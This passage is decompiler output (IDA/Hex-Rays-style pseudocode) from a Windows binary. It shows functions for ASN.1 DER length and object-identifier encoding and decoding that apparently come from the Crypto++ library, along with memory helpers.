  if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a1 + 152i64))(a1, &v7) )
    goto LABEL_11;
  if ( (v7 & 0x80u) != 0 )
  {
    v5 = v7 & 0x7F;
    if ( (v7 & 0x7F) == 0 )
    {
      result = 0;
      goto LABEL_10;
    }
    while ( 1 )
    {
      --v5;
      if ( v4 >= 0x100000000000000i64 )
        sub_13F10BF50();
      if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a1 + 152i64))(a1, &v7) )
        break;
      v4 = v7 | (v4 << 8);
      if ( !v5 )
        goto LABEL_9;
    }
LABEL_11:
    sub_13F10BF50();
  }
  v4 = v7;
LABEL_9:
  result = 1;
LABEL_10:
  *a2 = v4;
  return result;
}

//----- (000000013F10C090) ----------------------------------------------------
char __fastcall sub_13F10C090(__int64 a1, unsigned __int64 *a2, _BYTE *a3)
{
  unsigned __int8 v6; // al
  int v8; // ebx
  unsigned __int64 v9; // rcx
  unsigned __int8 v10; // [rsp+40h] [rbp+8h] BYREF

  if ( (*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a1 + 152i64))(a1, &v10) )
  {
    v6 = v10;
    if ( (v10 & 0x80u) == 0 )
    {
      *a3 = 1;
      *a2 = v6;
      return 1;
    }
    v8 = v10 & 0x7F;
    if ( (v10 & 0x7F) == 0 )
    {
      *a3 = v8;
      return 1;
    }
    v9 = 0i64;
    *a3 = 1;
    *a2 = 0i64;
    while ( 1 )
    {
      --v8;
      if ( v9 >= 0x100000000000000i64 )
        sub_13F10BF50();
      if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a1 + 152i64))(a1, &v10) )
        break;
      v9 = v10 | (*a2 << 8);
      *a2 = v9;
      if ( !v8 )
        return 1;
    }
  }
  return 0;
}

//----- (000000013F10C150) ----------------------------------------------------
__int64 __fastcall sub_13F10C150(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, char a6)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 40) + 264i64))(*(_QWORD *)(a1 + 40));
}

//----- (000000013F10C180) ----------------------------------------------------
__int64 __fastcall sub_13F10C180(__int64 a1, __int64 *a2)
{
  unsigned __int64 v4; // rsi
  __int64 v5; // rcx
  unsigned int v6; // edi
  unsigned int v7; // eax
  unsigned int v8; // ecx
  unsigned int v9; // er8
  unsigned int v10; // ecx
  unsigned int v11; // er8
  unsigned int v12; // er8
  unsigned int v13; // ebx
  __int64 v14; // rax
  char v16[8]; // [rsp+30h] [rbp-D0h] BYREF
  __int64 v17[3]; // [rsp+38h] [rbp-C8h] BYREF
  __int64 v18[10]; // [rsp+50h] [rbp-B0h] BYREF
  __m128i v19[2]; // [rsp+A0h] [rbp-60h] BYREF
  char pExceptionObject[64]; // [rsp+C0h] [rbp-40h] BYREF

  v17[1] = -2i64;
  sub_13F131450((__int64)v18, 0i64);
  v16[0] = 40 * **(_BYTE **)(a1 + 8) + *(_BYTE *)(*(_QWORD *)(a1 + 8) + 4i64);
  (*(void (__fastcall **)(__int64 *, char *, __int64))(v18[0] + 48))(v18, v16, 1i64);
  v4 = 2i64;
  v5 = *(_QWORD *)(a1 + 8);
  if ( (unsigned __int64)((*(_QWORD *)(a1 + 16) - v5) >> 2) > 2 )
  {
    do
    {
      v6 = *(_DWORD *)(v5 + 4 * v4);
      if ( v6 )
      {
        v9 = 0;
        v7 = 32;
        do
        {
          v10 = (v7 + v9) >> 1;
          if ( !(v6 >> v10) )
            v7 = (v7 + v9) >> 1;
          if ( !(v6 >> v10) )
            v10 = v9;
          v9 = v10;
        }
        while ( v7 - v10 > 1 );
        v8 = v7;
      }
      else
      {
        v7 = 0;
        v8 = 0;
      }
      v11 = 7;
      if ( v7 > 7 )
        v11 = v8;
      if ( v11 > 0xFFFFFFF9 )
      {
        sub_13F1053B0(v19, (const __m128i *)"RoundUpToMultipleOf: integer overflow");
        sub_13F101600((__int64)pExceptionObject, v19);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
      }
      v12 = v11 + 6 - (v11 + 6) % 7;
      v13 = v12 - 7;
      if ( v12 != 7 )
      {
        do
        {
          v16[0] = (v6 >> v13) | 0x80;
          (*(void (__fastcall **)(__int64 *, char *, __int64))(v18[0] + 48))(v18, v16, 1i64);
          v13 -= 7;
        }
        while ( v13 );
      }
      v16[0] = v6 & 0x7F;
      (*(void (__fastcall **)(__int64 *, char *, __int64))(v18[0] + 48))(v18, v16, 1i64);
      ++v4;
      v5 = *(_QWORD *)(a1 + 8);
    }
    while ( v4 < (*(_QWORD *)(a1 + 16) - v5) >> 2 );
  }
  v16[0] = 6;
  (*(void (__fastcall **)(__int64 *, char *, __int64))(*a2 + 48))(a2, v16, 1i64);
  v14 = sub_13F131BC0((__int64)v18);
  sub_13F10CBB0(a2, v14);
  v17[0] = -1i64;
  (*(void (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64 *, char))(v18[0] + 256))(
    v18,
    a2,
    v17,
    &qword_13F1B7008,
    1);
  return sub_13F1315A0(v18);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;
// 13F10C180: using guessed type char var_100[8];
// 13F10C180: using guessed type __m128i var_90[2];

//----- (000000013F10C3E0) ----------------------------------------------------
__int64 __fastcall sub_13F10C3E0(__int64 a1, __int64 *a2)
{
  unsigned int v4; // ebx
  _BYTE *v5; // rax
  char v6; // di
  unsigned int v7; // eax
  __int64 v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rcx
  unsigned __int64 v11; // rdx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  char v16; // [rsp+20h] [rbp-E0h]
  int v17; // [rsp+20h] [rbp-E0h]
  int v18; // [rsp+20h] [rbp-E0h]
  int v19; // [rsp+20h] [rbp-E0h]
  __m128i v20; // [rsp+30h] [rbp-D0h] BYREF
  __int64 (__fastcall **v21)(); // [rsp+40h] [rbp-C0h] BYREF
  __int64 v22; // [rsp+48h] [rbp-B8h]
  __int64 v23; // [rsp+58h] [rbp-A8h]
  __int64 v24[10]; // [rsp+60h] [rbp-A0h] BYREF
  __int64 *v25; // [rsp+B0h] [rbp-50h]
  __int16 v26; // [rsp+B8h] [rbp-48h]
  __int64 v27[10]; // [rsp+C0h] [rbp-40h] BYREF
  __int64 *v28; // [rsp+110h] [rbp+10h]
  __int16 v29; // [rsp+118h] [rbp+18h]
  __int64 v30[10]; // [rsp+120h] [rbp+20h] BYREF
  __int64 *v31; // [rsp+170h] [rbp+70h]
  __int16 v32; // [rsp+178h] [rbp+78h]
  __int64 v33; // [rsp+180h] [rbp+80h] BYREF

  v20.m128i_i64[1] = -2i64;
  sub_13F131450((__int64)v24, 0i64);
  v25 = a2;
  v26 = 48;
  v24[0] = (__int64)off_13F182398;
  v24[1] = (__int64)off_13F182508;
  LODWORD(v33) = 0;
  BYTE4(v33) = 0;
  v4 = 4;
  v5 = (char *)&v33 + 1;
  do
  {
    if ( *v5 )
      break;
    --v4;
    ++v5;
  }
  while ( v4 > 1 );
  v6 = ((_BYTE *)&v33 - v4)[5];
  v20.m128i_i8[0] = 2;
  sub_13F1320F0((__int64)v24, &v20, 1ui64);
  v7 = v4 + 1;
  if ( v6 >= 0 )
    v7 = v4;
  v8 = v7;
  sub_13F10CBB0(v24, v7);
  v16 = 1;
  (*(void (__fastcall **)(__int64 *, char *, _QWORD, _QWORD, char))(v24[0] + 48))(
    v24,
    (char *)&v33 - v8 + 5,
    (unsigned int)v8,
    0i64,
    v16);
  sub_13F131450((__int64)v27, 0i64);
  v28 = v24;
  v29 = 48;
  v27[0] = (__int64)off_13F182398;
  v27[1] = (__int64)off_13F182508;
  v9 = (*(__int64 (__fastcall **)(__int64, __int64 (__fastcall ***)()))(*(_QWORD *)a1 + 32i64))(a1, &v21);
  sub_13F10C180(v9, v27);
  v21 = off_13F181EC8;
  v10 = v22;
  if ( v22 )
  {
    v11 = 4 * ((v23 - v22) >> 2);
    if ( v11 >= 0x1000 )
    {
      v11 += 39i64;
      v10 = *(_QWORD *)(v22 - 8);
      if ( (unsigned __int64)(v22 - v10 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v10, v11);
  }
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a1 + 48i64))(a1, v27);
  HIBYTE(v29) = 1;
  v12 = sub_13F131BC0((__int64)v27);
  v20.m128i_i8[0] = v29;
  (*(void (__fastcall **)(__int64 *, __m128i *, __int64))(*v28 + 48))(v28, &v20, 1i64);
  sub_13F10CBB0(v28, v12);
  v33 = -1i64;
  LOBYTE(v17) = 1;
  (*(void (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64 *, int))(v27[0] + 256))(
    v27,
    v28,
    &v33,
    &qword_13F1B7008,
    v17);
  sub_13F131450((__int64)v30, 0i64);
  v30[0] = (__int64)off_13F182070;
  v30[1] = (__int64)off_13F1821E0;
  v31 = v24;
  v32 = 4;
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a1 + 64i64))(a1, v30);
  HIBYTE(v32) = 1;
  v13 = sub_13F131BC0((__int64)v30);
  v20.m128i_i8[0] = v32;
  (*(void (__fastcall **)(__int64 *, __m128i *, __int64))(*v31 + 48))(v31, &v20, 1i64);
  sub_13F10CBB0(v31, v13);
  v33 = -1i64;
  LOBYTE(v18) = 1;
  (*(void (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64 *, int))(v30[0] + 256))(
    v30,
    v31,
    &v33,
    &qword_13F1B7008,
    v18);
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a1 + 80i64))(a1, v24);
  HIBYTE(v26) = 1;
  v14 = sub_13F131BC0((__int64)v24);
  v20.m128i_i8[0] = v26;
  (*(void (__fastcall **)(__int64 *, __m128i *, __int64))(*v25 + 48))(v25, &v20, 1i64);
  sub_13F10CBB0(v25, v14);
  v33 = -1i64;
  LOBYTE(v19) = 1;
  (*(void (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64 *, int))(v24[0] + 256))(
    v24,
    v25,
    &v33,
    &qword_13F1B7008,
    v19);
  sub_13F10B5E0((__int64)v30);
  sub_13F10B5E0((__int64)v27);
  return sub_13F10B5E0((__int64)v24);
}
// 13F10C5F1: variable 'v17' is possibly undefined
// 13F10C69E: variable 'v18' is possibly undefined
// 13F10C71F: variable 'v19' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();
// 13F182070: using guessed type __int64 (__fastcall *off_13F182070[6])();
// 13F1821E0: using guessed type __int64 (__fastcall *off_13F1821E0[4])();
// 13F182398: using guessed type __int64 (__fastcall *off_13F182398[6])();
// 13F182508: using guessed type __int64 (__fastcall *off_13F182508[3])();
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F10C780) ----------------------------------------------------
__int64 __fastcall sub_13F10C780(__int64 a1, __int64 *a2)
{
  __int64 v4; // rax
  __int64 v5; // rcx
  unsigned __int64 v6; // rdx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  char v11; // [rsp+20h] [rbp-E0h]
  int v12; // [rsp+20h] [rbp-E0h]
  int v13; // [rsp+20h] [rbp-E0h]
  __m128i v14; // [rsp+30h] [rbp-D0h] BYREF
  __int64 v15; // [rsp+40h] [rbp-C0h]
  __int64 (__fastcall **v16)(); // [rsp+48h] [rbp-B8h] BYREF
  __int64 v17; // [rsp+50h] [rbp-B0h]
  __int64 v18; // [rsp+60h] [rbp-A0h]
  __int64 v19[10]; // [rsp+70h] [rbp-90h] BYREF
  __int64 *v20; // [rsp+C0h] [rbp-40h]
  __int16 v21; // [rsp+C8h] [rbp-38h]
  __int64 v22[10]; // [rsp+D0h] [rbp-30h] BYREF
  __int64 *v23; // [rsp+120h] [rbp+20h]
  __int16 v24; // [rsp+128h] [rbp+28h]
  __int64 v25[10]; // [rsp+130h] [rbp+30h] BYREF
  __int64 *v26; // [rsp+180h] [rbp+80h]
  __int16 v27; // [rsp+188h] [rbp+88h]

  v15 = -2i64;
  sub_13F131450((__int64)v25, 0i64);
  v26 = a2;
  v27 = 48;
  v25[0] = (__int64)off_13F182398;
  v25[1] = (__int64)off_13F182508;
  sub_13F131450((__int64)v22, 0i64);
  v23 = v25;
  v24 = 48;
  v22[0] = (__int64)off_13F182398;
  v22[1] = (__int64)off_13F182508;
  v4 = (*(__int64 (__fastcall **)(__int64, __int64 (__fastcall ***)()))(*(_QWORD *)a1 + 32i64))(a1, &v16);
  sub_13F10C180(v4, v22);
  v16 = off_13F181EC8;
  v5 = v17;
  if ( v17 )
  {
    v6 = 4 * ((v18 - v17) >> 2);
    if ( v6 >= 0x1000 )
    {
      v6 += 39i64;
      v5 = *(_QWORD *)(v17 - 8);
      if ( (unsigned __int64)(v17 - v5 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v5, v6);
  }
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a1 + 48i64))(a1, v22);
  HIBYTE(v24) = 1;
  v7 = sub_13F131BC0((__int64)v22);
  v14.m128i_i8[0] = v24;
  (*(void (__fastcall **)(__int64 *, __m128i *, __int64))(*v23 + 48))(v23, &v14, 1i64);
  sub_13F10CBB0(v23, v7);
  v14.m128i_i64[1] = -1i64;
  v11 = 1;
  (*(void (__fastcall **)(__int64 *, __int64 *, unsigned __int64 *, __int64 *, char))(v22[0] + 256))(
    v22,
    v23,
    &v14.m128i_u64[1],
    &qword_13F1B7008,
    v11);
  sub_13F131450((__int64)v19, 0i64);
  v19[0] = (__int64)off_13F182070;
  v19[1] = (__int64)off_13F1821E0;
  v20 = v25;
  v21 = 3;
  v14.m128i_i8[0] = 0;
  sub_13F1320F0((__int64)v19, &v14, 1ui64);
  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a1 + 64i64))(a1, v19);
  HIBYTE(v21) = 1;
  v8 = sub_13F131BC0((__int64)v19);
  v14.m128i_i8[0] = v21;
  (*(void (__fastcall **)(__int64 *, __m128i *, __int64))(*v20 + 48))(v20, &v14, 1i64);
  sub_13F10CBB0(v20, v8);
  v14.m128i_i64[1] = -1i64;
  LOBYTE(v12) = 1;
  (*(void (__fastcall **)(__int64 *, __int64 *, unsigned __int64 *, __int64 *, int))(v19[0] + 256))(
    v19,
    v20,
    &v14.m128i_u64[1],
    &qword_13F1B7008,
    v12);
  HIBYTE(v27) = 1;
  v9 = sub_13F131BC0((__int64)v25);
  v14.m128i_i8[0] = v27;
  (*(void (__fastcall **)(__int64 *, __m128i *, __int64))(*v26 + 48))(v26, &v14, 1i64);
  sub_13F10CBB0(v26, v9);
  v14.m128i_i64[1] = -1i64;
  LOBYTE(v13) = 1;
  (*(void (__fastcall **)(__int64 *, __int64 *, unsigned __int64 *, __int64 *, int))(v25[0] + 256))(
    v25,
    v26,
    &v14.m128i_u64[1],
    &qword_13F1B7008,
    v13);
  sub_13F10B5E0((__int64)v19);
  sub_13F10B5E0((__int64)v22);
  return sub_13F10B5E0((__int64)v25);
}
// 13F10C9C3: variable 'v12' is possibly undefined
// 13F10CA3E: variable 'v13' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();
// 13F182070: using guessed type __int64 (__fastcall *off_13F182070[6])();
// 13F1821E0: using guessed type __int64 (__fastcall *off_13F1821E0[4])();
// 13F182398: using guessed type __int64 (__fastcall *off_13F182398[6])();
// 13F182508: using guessed type __int64 (__fastcall *off_13F182508[3])();
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F10CAA0) ----------------------------------------------------
__int64 __fastcall sub_13F10CAA0(__int64 *a1)
{
  __int64 v1; // rax
  __int64 v3; // rax
  char v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *a1;
  v5 = 5;
  (*(void (__fastcall **)(__int64 *, char *, __int64))(v1 + 48))(a1, &v5, 1i64);
  v3 = *a1;
  v5 = 0;
  return (*(__int64 (__fastcall **)(__int64 *, char *, __int64))(v3 + 48))(a1, &v5, 1i64);
}

//----- (000000013F10CAF0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10CAF0(__int64 *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rax
  __int64 v7; // rbx
  char v9; // [rsp+20h] [rbp-18h]
  char v10; // [rsp+40h] [rbp+8h] BYREF

  v3 = *a1;
  v10 = 4;
  (*(void (__fastcall **)(__int64 *, char *, __int64))(v3 + 48))(a1, &v10, 1i64);
  v9 = 1;
  v7 = sub_13F10CBB0(a1, a3);
  (*(void (__fastcall **)(__int64 *, __int64, unsigned __int64, _QWORD, char))(*a1 + 48))(a1, a2, a3, 0i64, v9);
  return v7 + a3 + 1;
}

//----- (000000013F10CB70) ----------------------------------------------------
__int64 __fastcall sub_13F10CB70(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  char v4; // [rsp+28h] [rbp-10h]
  __int64 v5; // [rsp+40h] [rbp+8h] BYREF

  v2 = *(_QWORD *)(a1 + 24);
  v4 = 1;
  v5 = 0i64;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64, __int64 *, char))(v2 + 264))(
           a1 + 24,
           a2,
           &v5,
           -1i64,
           &qword_13F1B7008,
           v4);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F10CBB0) ----------------------------------------------------
__int64 __fastcall sub_13F10CBB0(__int64 *a1, unsigned __int64 a2)
{
  __int64 v4; // rax
  unsigned int v6; // ebx
  unsigned int v7; // esi
  unsigned int v8; // er8
  unsigned int v9; // edx
  unsigned int v10; // ecx
  __int64 v11; // rax
  unsigned int v12; // ecx
  unsigned int v13; // ebx
  int v14; // esi
  __int64 v15; // rbp
  char v16; // [rsp+58h] [rbp+10h] BYREF

  if ( a2 > 0x7F )
  {
    v6 = 64;
    v7 = 0;
    v8 = 0;
    v9 = 64;
    do
    {
      v10 = (v9 + v8) >> 1;
      if ( !(a2 >> v10) )
        v9 = (v9 + v8) >> 1;
      if ( !(a2 >> v10) )
        v10 = v8;
      v8 = v10;
    }
    while ( v9 - v10 > 8 );
    v11 = *a1;
    v16 = (v9 >> 3) | 0x80;
    (*(void (__fastcall **)(__int64 *, char *, __int64))(v11 + 48))(a1, &v16, 1i64);
    if ( !a2 )
      return 1i64;
    do
    {
      v12 = (v6 + v7) >> 1;
      if ( !(a2 >> v12) )
        v6 = (v6 + v7) >> 1;
      if ( !(a2 >> v12) )
        v12 = v7;
      v7 = v12;
    }
    while ( v6 - v12 > 8 );
    v13 = v6 >> 3;
    if ( v13 )
    {
      v14 = 8 * v13 - 8;
      v15 = v13;
      do
      {
        v16 = a2 >> v14;
        (*(void (__fastcall **)(__int64 *, char *, __int64))(*a1 + 48))(a1, &v16, 1i64);
        v14 -= 8;
        --v13;
      }
      while ( v13 );
      return v15 + 1;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    v4 = *a1;
    v16 = a2;
    (*(void (__fastcall **)(__int64 *, char *, __int64))(v4 + 48))(a1, &v16, 1i64);
    return 1i64;
  }
}
// 13F10CC01: conditional instruction was optimized away because rdx.8>=80u

//----- (000000013F10CD00) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F10CD00(__int64 *a1, __int64 *a2))()
{
  char v4; // di
  char v5; // bl
  __int64 v6; // rbx
  int v8; // [rsp+28h] [rbp-89h]
  unsigned __int16 v9; // [rsp+38h] [rbp-79h] BYREF
  char v10[8]; // [rsp+40h] [rbp-71h] BYREF
  __int64 v11[2]; // [rsp+48h] [rbp-69h] BYREF
  __int64 v12[3]; // [rsp+58h] [rbp-59h] BYREF
  int v13; // [rsp+70h] [rbp-41h]
  char v14; // [rsp+78h] [rbp-39h]
  __int64 *v15; // [rsp+80h] [rbp-31h]
  __int64 v16; // [rsp+88h] [rbp-29h] BYREF
  char v17; // [rsp+90h] [rbp-21h]
  char v18[7]; // [rsp+91h] [rbp-20h] BYREF
  __int64 v19[10]; // [rsp+98h] [rbp-19h] BYREF
  __int64 *v20; // [rsp+E8h] [rbp+37h]
  char v21; // [rsp+F0h] [rbp+3Fh]
  char v22; // [rsp+F1h] [rbp+40h]

  v11[1] = -2i64;
  (*(void (__fastcall **)(__int64 *, char *))(*a1 + 168))(a1, v10);
  v4 = v10[0];
  sub_13F10EE30((__int64)v12, 0);
  v13 = -1;
  v14 = 0;
  v12[0] = (__int64)off_13F181ED8;
  v12[1] = (__int64)off_13F182050;
  v15 = a1;
  v16 = 0i64;
  v17 = 0;
  if ( !(*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *))(*a1 + 152))(a1, &v9) || (_BYTE)v9 != v4 )
    sub_13F10BF50();
  if ( !sub_13F10C090((__int64)v15, (unsigned __int64 *)&v16, v18) )
    sub_13F10BF50();
  if ( !v18[0] && (v4 & 0x20) == 0 )
    sub_13F10BF50();
  v5 = v10[0];
  sub_13F131450((__int64)v19, 0i64);
  v19[0] = (__int64)off_13F182070;
  v19[1] = (__int64)off_13F1821E0;
  v20 = a2;
  v21 = v5;
  v22 = 0;
  if ( v18[0] )
  {
    v11[0] = v16;
    (*(void (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64 *, char))(v12[0] + 256))(
      v12,
      v19,
      v11,
      &qword_13F1B7008,
      1);
  }
  else
  {
    while ( sub_13F1109A0(v15, &v9, 1) != 2 || v9 )
    {
      while ( 1 )
      {
        sub_13F10CD00(v12, v19);
        if ( !v18[0] )
          break;
        if ( !v16 )
          goto LABEL_8;
      }
    }
  }
LABEL_8:
  v17 = 1;
  if ( v18[0] )
  {
    if ( v16 )
      sub_13F10BF50();
  }
  else if ( sub_13F110490(v15, &v9, 1) != 2 || v9 )
  {
    sub_13F10BF50();
  }
  v22 = 1;
  v6 = sub_13F131BC0((__int64)v19);
  LOBYTE(v9) = v21;
  (*(void (__fastcall **)(__int64 *, unsigned __int16 *, __int64))(*v20 + 48))(v20, &v9, 1i64);
  sub_13F10CBB0(v20, v6);
  v11[0] = -1i64;
  LOBYTE(v8) = 1;
  (*(void (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64 *, int))(v19[0] + 256))(
    v19,
    v20,
    v11,
    &qword_13F1B7008,
    v8);
  sub_13F10B5E0((__int64)v19);
  return sub_13F10B560((__int64)v12);
}
// 13F10CF21: variable 'v8' is possibly undefined
// 13F181ED8: using guessed type __int64 (__fastcall *off_13F181ED8[47])();
// 13F182050: using guessed type __int64 (__fastcall *off_13F182050[4])();
// 13F182070: using guessed type __int64 (__fastcall *off_13F182070[6])();
// 13F1821E0: using guessed type __int64 (__fastcall *off_13F1821E0[4])();
// 13F1B7008: using guessed type __int64 qword_13F1B7008;
// 13F10CD00: using guessed type char var_C8[8];
// 13F10CD00: using guessed type char var_77[7];

//----- (000000013F10CF80) ----------------------------------------------------
char __fastcall sub_13F10CF80(__int64 a1, char a2)
{
  char result; // al
  char v5; // [rsp+30h] [rbp+8h] BYREF

  if ( !(*(__int64 (__fastcall **)(_QWORD, char *))(**(_QWORD **)(a1 + 40) + 152i64))(*(_QWORD *)(a1 + 40), &v5)
    || v5 != a2
    || (result = sub_13F10C090(*(_QWORD *)(a1 + 40), (unsigned __int64 *)(a1 + 48), (_BYTE *)(a1 + 57))) == 0
    || !*(_BYTE *)(a1 + 57) && (a2 & 0x20) == 0 )
  {
    sub_13F10BF50();
  }
  return result;
}

//----- (000000013F10D000) ----------------------------------------------------
__int64 __fastcall sub_13F10D000(__int64 a1)
{
  return sub_13F131BC0(*(_QWORD *)(a1 + 24)) - *(_QWORD *)(a1 + 40);
}

//----- (000000013F10D020) ----------------------------------------------------
void __fastcall sub_13F10D020(__int64 a1)
{
  bool v1; // zf
  unsigned __int16 v2; // [rsp+30h] [rbp+8h] BYREF

  v1 = *(_BYTE *)(a1 + 57) == 0;
  *(_BYTE *)(a1 + 56) = 1;
  if ( v1 )
  {
    if ( sub_13F110490(*(__int64 **)(a1 + 40), &v2, 1) != 2 || v2 )
      sub_13F10BF50();
  }
  else if ( *(_QWORD *)(a1 + 48) )
  {
    sub_13F10BF50();
  }
}

//----- (000000013F10D070) ----------------------------------------------------
__int64 __fastcall sub_13F10D070(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rcx
  unsigned __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rdx
  char v8; // [rsp+20h] [rbp-18h]
  __int64 v9; // [rsp+40h] [rbp+8h] BYREF

  *(_BYTE *)(a1 + 89) = 1;
  v2 = sub_13F131BC0(a1);
  v3 = *(_QWORD *)(a1 + 80);
  v4 = v2;
  LOBYTE(v9) = *(_BYTE *)(a1 + 88);
  (*(void (__fastcall **)(__int64, __int64 *, __int64))(*(_QWORD *)v3 + 48i64))(v3, &v9, 1i64);
  sub_13F10CBB0(*(__int64 **)(a1 + 80), v4);
  v5 = *(_QWORD *)a1;
  v6 = *(_QWORD *)(a1 + 80);
  v9 = -1i64;
  v8 = 1;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64 *, char))(v5 + 256))(
           a1,
           v6,
           &v9,
           &qword_13F1B7008,
           v8);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F10D0F0) ----------------------------------------------------
__int64 __fastcall sub_13F10D0F0(__int64 a1, __int64 a2, unsigned __int64 *a3)
{
  unsigned __int64 v5; // rax
  __int64 result; // rax
  unsigned __int64 v7; // rcx

  if ( *(_BYTE *)(a1 + 57) )
  {
    v5 = *(_QWORD *)(a1 + 48);
    if ( *a3 > v5 )
      *a3 = v5;
  }
  result = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 40) + 256i64))(*(_QWORD *)(a1 + 40));
  if ( *(_BYTE *)(a1 + 57) )
  {
    v7 = *(_QWORD *)(a1 + 48);
    if ( v7 < *a3 )
      sub_13F10BF50();
    *(_QWORD *)(a1 + 48) = v7 - *a3;
  }
  return result;
}

//----- (000000013F10D160) ----------------------------------------------------
__int64 __fastcall sub_13F10D160(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rcx
  unsigned __int64 v9; // rdx
  __int64 result; // rax

  v6 = *a1;
  if ( v6 )
  {
    v9 = (a1[2] - v6) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v9 >= 0x1000 )
    {
      v9 += 39i64;
      if ( (unsigned __int64)(v6 - *(_QWORD *)(v6 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v6 = *(_QWORD *)(v6 - 8);
    }
    sub_13F14088C(v6, v9);
  }
  *a1 = a2;
  a1[1] = a2 + 4 * a3;
  result = a2 + 4 * a4;
  a1[2] = result;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10D1F0) ----------------------------------------------------
void __noreturn sub_13F10D1F0()
{
  sub_13F10998C((__int64)"vector<T> too long");
}

//----- (000000013F10D210) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10D210(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 result; // rax
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rcx

  result = 4 * a2;
  if ( a2 > 0x3FFFFFFFFFFFFFFFi64 )
  {
    result = -1i64;
LABEL_4:
    v3 = result + 39;
    if ( result + 39 <= result )
      v3 = -1i64;
    v4 = sub_13F14059C(v3);
    v5 = v4;
    if ( !v4 )
      sub_13F1682C0();
    result = (v4 + 39) & 0xFFFFFFFFFFFFFFE0ui64;
    *(_QWORD *)(result - 8) = v5;
    return result;
  }
  if ( result >= 0x1000 )
    goto LABEL_4;
  if ( result )
    return sub_13F14059C(4 * a2);
  return result;
}

//----- (000000013F10D290) ----------------------------------------------------
void __fastcall sub_13F10D290(_QWORD *a1, unsigned __int64 a2)
{
  __m128i *v4; // rbx
  unsigned __int64 v5; // r15
  __m128i *v6; // r14
  unsigned __int64 v7; // rdx

  v4 = (__m128i *)a1[3];
  v5 = a1[2];
  if ( v5 != a2 )
  {
    if ( a2 )
      v6 = (__m128i *)sub_13F12E4E0(a2);
    else
      v6 = 0i64;
    v7 = v5;
    if ( a2 < v5 )
      v7 = a2;
    if ( v4 )
    {
      if ( v6 )
        sub_13F10D330(v6, v7, v4, v7);
      memset(v4, 0, v5);
      sub_13F12E550(v4);
    }
    v4 = v6;
  }
  a1[3] = v4;
  a1[2] = a2;
  a1[1] = -1i64;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F10D330) ----------------------------------------------------
__int64 __fastcall sub_13F10D330(__m128i *a1, unsigned __int64 a2, const __m128i *a3, unsigned __int64 a4)
{
  if ( !a4 )
    return 0i64;
  if ( !a1 )
  {
LABEL_3:
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 22i64;
  }
  if ( a3 && a2 >= a4 )
  {
    sub_13F15EB00(a1, a3, a4);
    return 0i64;
  }
  sub_13F15EF70((__int64)a1, 0, a2);
  if ( !a3 )
    goto LABEL_3;
  if ( a2 >= a4 )
    return 22i64;
  *(_DWORD *)sub_13F169DAC() = 34;
  sub_13F1682A0();
  return 34i64;
}

//----- (000000013F10D3E0) ----------------------------------------------------
__int64 sub_13F10D3E0(_BYTE *a1, unsigned __int64 a2, __int64 a3, ...)
{
  __int64 *v6; // rax
  __int64 result; // rax
  va_list va; // [rsp+78h] [rbp+20h] BYREF

  va_start(va, a3);
  v6 = sub_13F1013F0();
